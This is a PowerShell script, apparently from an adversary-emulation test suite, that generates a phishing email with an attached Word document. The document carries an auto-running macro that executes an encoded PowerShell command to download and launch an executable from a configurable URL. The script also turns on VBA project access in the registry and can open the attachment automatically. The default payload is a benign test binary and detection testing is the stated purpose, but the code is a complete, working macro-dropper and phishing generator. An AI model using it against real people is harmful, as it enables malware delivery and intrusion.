function Invoke-DocPhish {

<#
    .SYNOPSIS
        This is a simple script that will take in parameters to generate a phishing email with an attachment containing a macro, that will download a benign executable or an executable of your choice.

        Function: Invoke-DocPhish
        Author: Brandon Denker
        License: MIT License
        Required Dependencies: powershell-yaml
        Optional Dependencies: None

    .DESCRIPTION

        Utilize this script to create a Word document, attach it to an email and save the Email.

    .PARAMETER Generate

        Accepts Msg or Doc. Msg will generate the document and email, while Doc will only generate the document.

    .PARAMETER Execute

        Accepts True or False. Email and Document or just Document will be opened and executed.

    .PARAMETER DocName

        Specifies the name of the attached document. OMIT EXTENSION

    .PARAMETER DocPath

        Specifies the path in which the document will be saved. Only changed if a specific location is desired to appear in logging. The document is removed upon the script completion

    .PARAMETER DocImage

        Specifies the path for an image file to insert into the document instead of the default Atomic Test statement

    .PARAMETER MsgName

        Specify the name of the email message. OMIT EXTENSION

    .PARAMETER MsgPath

        Specify the path the final message is saved to.

    .PARAMETER MsgSubject

        Specify the subject of the email

    .PARAMETER MsgFrom

        Specify the email address of the sender to show in To

    .PARAMETER MsgTo

        Specify the email address of the recipient to show in To

    .PARAMETER MsgBody

        Specify the body of the message. MUST BE SINGLE LINE. Each new line is specified by ^r^n.

    .PARAMETER ExeName

        Specifies the name of the exectuable on disk (when it is saved and launched). OMIT EXTENSION

    .PARAMETER ExePath

        Specify the path which the downloaded executable will spawn from.

    .PARAMETER ExeUrl

        Specify the URL of the executable to download and execute

    .EXAMPLE

        Create Default Email
        PS> Invoke-DocPhish -Generate "Msg"
        PS> Invoke-DocPhish -Generate "Msg" -Execute "True"
        PS> Invoke-DocPhish -Generate "Msg" -MsgTo "dschrute@dundermifflin.com" -MsgSubject "Secret Mission" -MsgBody "Kurt,`r`n`r`nMeet me on the roof!" -DocName "Secret" -MsgName "Secret"

    .NOTES

        =- At this time the sender address cannot be defined due to limitations in PowerShell -=
        Use the '--Verbose' option to print detailed information.

#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True)]
        [string]$Generate = "Msg",

        [Parameter(Mandatory = $False)]
        [string]$Execute = "False",

        [Parameter(Mandatory = $False)]
        [string]$DocImage = "Default",

        [Parameter(Mandatory = $False)]
        [string]$DocName = "HarperCollins",

        [Parameter(Mandatory = $False)]
        [string]$DocPath = $( if ($IsLinux -or $IsMacOS) { $Env:HOME } else { $env:temp }),

        [Parameter(Mandatory = $False)]
        [string]$MsgName = "HarperCollins",

        [Parameter(Mandatory = $False)]
        [string]$MsgPath = $( if ($IsLinux -or $IsMacOS) { $Env:HOME } else { $env:temp }),

        [Parameter(Mandatory = $False)]
        [string]$MsgFrom = "dschrute@dundermifflin.com",

        [Parameter(Mandatory = $False)]
        [string]$MsgTo = "dschofield@harpercollins.com",

        [Parameter(Mandatory = $False)]
        [string]$MsgSubject = "Harper Collins - Best Offer",

        [Parameter(Mandatory = $False)]
        [string]$MsgBody = "Dear Sir,`r`n`r`nI have attached Dunder Mifflin's Best Offer to retain your business. You will not be disappointed for staying with Dunder Mifflin, it is my personal guarantee.`r`n`r`nIf you shall accept Michael Scott's Paper Company's offer, you shall be very disappointed and will soon return. That is a fact! I know you will make the right choice.`r`n`r`n`r`n`r`nRespectfully,`r`n`r`n`r`nDwight K. Schrute`r`nAssistant to the Region Manager`r`nDunder Mifflin Paper Company`r`nCustomer Service: 570-555-3455`r`nWork: 570-555-3453`r`nCell: 570-555-8759`r`nHome: 570-555-9986`r`nPager: 570-555-6654`r`nPage 2: 570-555-7754`r`n`r`n-I never take vacations, I never get sick. And I don't celebrate any major holidays-",

        [Parameter(Mandatory = $False)]
        [string]$ExeName = "168",

        [Parameter(Mandatory = $False)]
        [string]$ExePath = $( if ($IsLinux -or $IsMacOS) { $Env:HOME } else { $env:temp }),

        [Parameter(Mandatory = $False)]
        [string]$ExeUrl = "https://raw.githubusercontent.com/CyborgSecurity/atomic-red-team/Cyborg/atomics/T1204.002/bin/168.exe")

    if ( $Generate -eq "Msg" ) {
        Write-Host -ForegroundColor Yellow "  [+] Selected: Doc and Msg Creation"
        }
    elseif ( $Generate -eq "Doc" ) {
        Write-Host -ForegroundColor Yellow "  [+] Selected: Doc Creation Only"
        }
    else {
        Write-Host -ForegroundColor Red "  [-] No Creation Type Selected or Unsupported Type Entered, Add -Generate Msg or -Generate Doc to your Command Args"
        Break
        }

    Try {
        # Set full paths for saving files
        $TmpDocName = $DocName + ".doc"
        $DocFullPath = Join-Path -Path $DocPath -ChildPath $TmpDocName
        $TmpMsgName = $MsgName + ".msg"
                $MsgFullPath = Join-path -Path $MsgPath -ChildPath $TmpMsgName
        $TmpExecutableName = $ExeName + ".exe"
        $ExecutableFullPath = Join-Path -Path $ExePath -ChildPath $TmpExecutableName

        # Validate paths exist, if not create them
        If ( -Not (Test-Path -Path $DocPath )) {
            Write-Verbose "Doc Directory Does Not Exist - Creating"
            New-Item -ItemType directory -Path $DocPath | Out-Null }
        If ( -Not (Test-Path -Path $MsgPath )) {
            Write-Verbose "Message Directory Does Not Exist - Creating"
            New-Item -ItemType directory -Path $MsgPath | Out-Null }
        If ( -Not (Test-Path -Path $ExePath )) {
            Write-Verbose "Executable Directory Does Not Exist - Creating"
            New-Item -ItemType directory -Path $ExePath | Out-Null }

        # Setup EncodedCommand
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Write-Verbose "Setting up Encoded Command"
        $Command = "`$client = new-object System.Net.WebClient;`$client.DownloadFile(`"$ExeUrl`",`"$ExecutableFullPath`"); Start-Process -Filepath `"$ExecutableFullPath`""
        Write-Verbose "Command Executed by Macro: $Command"
        $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
        $EncodedCommand = [Convert]::ToBase64String($Bytes)
        $macrocode = "Sub AutoOpen() `n`n    Shell `"powershell.exe -EncodedCommand $EncodedCommand`" `nEnd Sub"

        #Cleanup
        Write-Verbose "Cleaning up old files if they exist"
        Remove-Item "$DocFullPath" -Force -ErrorAction Ignore
        Remove-Item "$ExecutableFullPath" -Force -ErrorAction Ignore
        Remove-Item "$MsgFullPath" -Force -ErrorAction Ignore

        #Create Document
        Write-Verbose "  [ ] EncodedCommand = $EncodedCommand"
        Write-Verbose "  [ ] Document Path and Name = $DocFullPath"
        Write-Verbose "  [ ] Email Path and Name = $MsgFullPath"
        Write-Verbose "  [ ] Executable Path and Name = $ExecutableFullPath"
        Write-Verbose "  [ ] Macro Code = $macrocode"

        Try {
            Write-Verbose "Generating Macro Document at $DocFullPath"
            $Word = New-Object -ComObject "Word.Application"
            $WordVersion = $Word.Version
            Stop-Process -Name "WINWORD" -ErrorAction Ignore
            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security\" -Name 'AccessVBOM' -Value 1
            $Word = New-Object -ComObject "Word.Application"
            $doc = $Word.Documents.Add()
            $Selection = $Word.Selection
            if ($DocImage -eq "Default") {
                    $Selection.TypeText("If Enable Content or Enable Editing shows in a bar across the top fo the document, click to continue the Atomic Test.

For awareness, the following command will be executed by this document:
$Command")
            }

            else {
                if ( -Not (Test-Path -Path $DocImage )) {
                    Write-Host -ForegroundColor Red "  [-] Image Path Does Not Exist, adding default verbiage in document"
                    $Selection.TypeText("If Enable Content or Enable Editing shows in a bar across the top fo the document, click to continue the Atomic Test.

For awareness, the following command will be executed by this document:
$Command")
                }

                else {
                    $Selection.InlineShapes.AddPicture("$DocImage") | Out-Null
                    $Selection.InsertNewPage()
                }
            }
            $Word.ActiveDocument.VBProject.VBComponents.Add(1) | Out-Null
            $Word.VBE.ActiveVBProject.VBComponents.Item("Module1").CodeModule.AddFromString($macrocode) | Out-Null
            Add-Type -AssemblyName Microsoft.Office.Interop.Word | Out-Null
            $doc.SaveAs("$DocFullPath", [Microsoft.Office.Interop.Word.WdSaveFormat]::wdFormatDocument) | Out-Null
            $doc.Close() | Out-Null
            $Word.Quit() | Out-Null
            Write-Verbose "Created Document at $DocFullPath"
        }

        Catch {
            Write-Host -ForegroundColor Red "  [-] Failed to Create Document at $DocFullPath"
        }

        #Create Outlook message
        if ( $Generate -eq "Msg" ) {
            Write-Host -ForegroundColor Yello "  [-] You may receive a popup asking for permission to contacts, click allow"
            Write-Verbose "Creating Outlook Message"
            $OutlookCheck = Get-Process -Name "Outlook" -ErrorAction SilentlyContinue

            if ($OutlookCheck) {
                Write-Host -ForegroundColor Yellow "  [-] Outlook is already open, closing to continue"
                Stop-Process -Name "OUTLOOK" -Force -ErrorAction Ignore
                }

            Try {
                $Outlook = New-Object -ComObject Outlook.Application
                $Message = $Outlook.CreateItem(0)
                $Message.To = "$MsgTo"
                $Message.Sender = "$MsgFrom"
                $Message.Subject = "$MsgSubject"
                $Message.Body = "$MsgBody"
                $Message.Attachments.Add("$DocFullPath") | Out-Null
                $Message.SaveAs("$MsgFullPath")
                $Message.Close(1)
                $Outlook.Quit()

                if ($Execute -eq "True") {
                    Write-Host -ForegroundColor Green "  [+] Opening Email and Document"
                    $NewOutlookCheck = Get-Process -Name "OUTLOOK" -ErrorAction SilentlyContinue
                    if ($NewOutlookCheck) {
                        Write-Host -ForegroundColor Yellow "    [-] Outlook is already open, closing to continue"
                        Stop-Process -Name "OUTLOOK" -ErrorAction Ignore
                        }
                    Write-Host -ForegroundColor Yellow "  [+] Sleeping for 30 seconds to provide separation in logging"
                    Start-Sleep -s 30
                    $NewOutlook = New-Object -ComObject Outlook.Application
                    $NewMessage = $NewOutlook.Session.OpenSharedItem("$MsgFullPath")
                    $AttachmentName = $NewMessage.Attachments.Item(1).FileName
                    $TempDocLocation = Join-Path -Path $env:USERPROFILE\AppData\Local\Microsoft\Windows\INetCache -ChildPath $AttachmentName
                    $NewMessage.Attachments(1).saveasfile("$TempDocLocation")
                    Write-Host -ForegroundColor Yellow "  [+] Showing Completed Email Message"
                    $NewMessage.Display()
                    $NewWord = New-Object -ComObject Word.Application
                    Write-Host -ForegroundColor Yellow "  [+] Opening Word Doc and Executing Macro"
                    $NewWord.Documents.Open("$TempDocLocation") | Out-Null
                    #$NewWord.Run("AutoOpen")
                    Write-Host -ForegroundColor Yellow "  [+] Cleaning Up Email and Document Files"
                    Start-Sleep -s 10
                    $NewWord.Quit()
                    $NewOutlook.Quit()
                    Stop-Process -Name "OUTLOOK" -ErrorAction Ignore
                    Write-Host -ForegroundColor Green "  [+] Downloaded Executable Located: $ExecutableFullPath"
                }
            }
            Catch {
                Write-Host -ForegroundColor Red "  [-] Failed to Create Email Message with Outlook"
            }

                # Cleanup
                Write-Verbose "Force stopping Outlook and cleaning up document"
                Stop-Process -Name "Outlook" -Force -ErrorAction Ignore
                Remove-Item "$DocFullPath" -Force -ErrorAction Ignore

                # Output finished information
                Write-Host -ForegroundColor Green "  [+] Email Located: $MsgFullPath"
        }

        else {
            # Output finished information
            Write-Host -ForegroundColor Green "  [+] Document Located: $DocFullPath"
            if ($Execute -eq "True") {
                $NewWord = New-Object -ComObject Word.Application
                Write-Host -ForegroundColor Green "  [+] Opening Word Doc and Executing Macro"
                $NewWord.Documents.Open("$DocFullPath") | Out-Null
                #$NewWord.Run("AutoOpen")
                Write-Host -ForegroundColor Yellow "  [+] Cleaning Up Document Files"
                Start-Sleep -s 10
                $NewWord.Quit()
                Stop-Process -Name "WINWORD" -ErrorAction Ignore
                Write-Host -ForegroundColor Green "  [+] Downloaded Executable Located: $ExecutableFullPath"
                }
        }
    }

    Catch {
        Write-Host -ForegroundColor Red "[-] Failed to generate email or document"
    }
}
